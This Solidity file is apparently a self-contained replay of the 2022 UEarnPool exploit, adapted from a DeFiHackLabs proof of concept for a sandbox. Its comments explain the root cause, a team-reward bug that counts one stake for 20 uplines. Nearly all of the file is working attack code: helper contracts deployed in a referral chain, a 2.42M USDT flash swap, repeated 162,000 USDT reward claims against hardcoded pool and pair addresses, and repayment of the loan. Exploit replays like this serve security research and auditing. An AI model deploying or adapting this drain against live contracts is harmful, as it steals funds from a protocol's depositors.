// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-11-UEarnPool).
//
// The DeFiHackLabs PoC (test/UEarnPool_exp.sol) runs the attack INLINE in the
// Foundry `ContractTest` harness — the PancakeSwap flash-swap callback
// `pancakeCall` lives on the test itself (`attacker = address(this)`), the test
// create2-deploys 22 helper `claimReward` contracts, binds them into one
// referral chain, and measures profit as `USDT.balanceOf(address(this))`. There
// is no standalone contract to deploy. This file is a faithful, self-contained
// copy of that inline attack (testExploit + contractFactory + pancakeCall + the
// claimReward helper + minimal inline interfaces — no imports so it compiles
// anywhere), compiled inside the registry forge project. Logic and constants are
// copied verbatim from test/UEarnPool_exp.sol.
//
// Root cause: UEarnPool's `_addTeamAmount` replicates a single stake into the
// `teamAmount` of up to 20 uplines, while `claimTeamReward` pays the one-time
// tier reward INDEPENDENTLY to each address that qualifies. So one 2.4M stake
// makes 20 sibling addresses simultaneously "level-3 qualified"; each then
// stakes only 20,000 USDT (the trivial own-amount gate) and claims 162,000 USDT
// — 17 times — draining the pool's real treasury of phantom team rewards.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUEarnPool {
    function bindInvitor(address invitor) external;
    function stake(uint256 pid, uint256 amount) external;
    function claimTeamReward(address account) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

// The helper contract the attack deploys 22× via create2. Copied verbatim from
// the test's `claimReward` contract (bind / stakeAndClaimReward / withdraw).
contract ClaimReward {
    IUEarnPool constant Pool = IUEarnPool(0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function bind(address invitor) external {
        Pool.bindInvitor(invitor);
    }

    function stakeAndClaimReward(uint256 amount) external {
        USDT.approve(address(Pool), type(uint256).max);
        Pool.stake(0, amount);
        Pool.claimTeamReward(address(this));
    }

    function withdraw(address receiver) external {
        USDT.transfer(receiver, USDT.balanceOf(address(this)));
    }
}

contract UEarnPoolDrain {
    IUEarnPool constant Pool = IUEarnPool(0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c);
    IUniswapV2Pair constant Pair = IUniswapV2Pair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    address[] public contractList;

    function run() external {
        contractFactory();
        // Bind the 22 contracts into ONE referral chain: list[0] → tx.origin,
        // list[i] → list[i-1]. In the Foundry test tx.origin is the deployer; here
        // the deployer IS the caller, so bind list[0] to msg.sender (== attacker).
        ClaimReward(contractList[0]).bind(msg.sender);
        for (uint256 i = 1; i < 22; i++) {
            ClaimReward(contractList[i]).bind(contractList[i - 1]);
        }

        // Flash-borrow 2,420,000 USDT from the USDT/BUSD Pancake pair; the
        // pancakeCall callback below drains the pool and repays within this tx.
        Pair.swap(2_420_000 * 1e18, 0, address(this), new bytes(1));
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        uint256 len = contractList.length;
        // LevelConfig[3].teamAmount == 2_400_000. A single 2.4M stake credits
        // teamAmount += 2.4M to all ~20 uplines via _addTeamAmount, and the deepest
        // staker also claims its own 162k.
        USDT.transfer(contractList[len - 1], 2_400_000 * 1e18);
        ClaimReward(contractList[len - 1]).stakeAndClaimReward(2_400_000 * 1e18);
        // Walk UP the chain: each upline stakes a trivial 20,000 USDT (just enough
        // to clear the level-3 own-amount gate), then claims the 162,000 USDT
        // reward — 16 more times.
        for (uint256 i = len - 2; i > 4; i--) {
            USDT.transfer(contractList[i], 20_000 * 1e18); // LevelConfig[3].amount
            // 162000 - 20000 + 1500, 1500 is the reduce amount of _addInviteReward();
            // claim remaining USDT when USDT amount in pool < 143_500, keep the pool
            // flush so the next 162k claim never reverts for insufficient balance.
            if (USDT.balanceOf(address(Pool)) < 143_500 * 1e18) {
                USDT.transfer(address(Pool), 143_500 * 1e18 - USDT.balanceOf(address(Pool)));
            }
            ClaimReward(contractList[i]).stakeAndClaimReward(20_000 * 1e18);
            ClaimReward(contractList[i]).withdraw(address(this));
        }
        // Withdraw the leftover invite-reward USDT from the lowest 5 contracts.
        ClaimReward(contractList[0]).withdraw(address(this));
        ClaimReward(contractList[1]).withdraw(address(this));
        ClaimReward(contractList[2]).withdraw(address(this));
        ClaimReward(contractList[3]).withdraw(address(this));
        ClaimReward(contractList[4]).withdraw(address(this));
        // Repay the flash swap: 2,420,000 * 10000 / 9975 + 1000 (0.25% fee).
        uint256 borrowAmount = 2_420_000 * 1e18;
        USDT.transfer(address(Pair), borrowAmount * 10_000 / 9975 + 1000);
    }

    function contractFactory() internal {
        bytes memory bytecode = type(ClaimReward).creationCode;
        for (uint256 _salt = 0; _salt < 22; _salt++) {
            address _add;
            assembly {
                _add := create2(0, add(bytecode, 32), mload(bytecode), _salt)
            }
            contractList.push(_add);
        }
    }
}
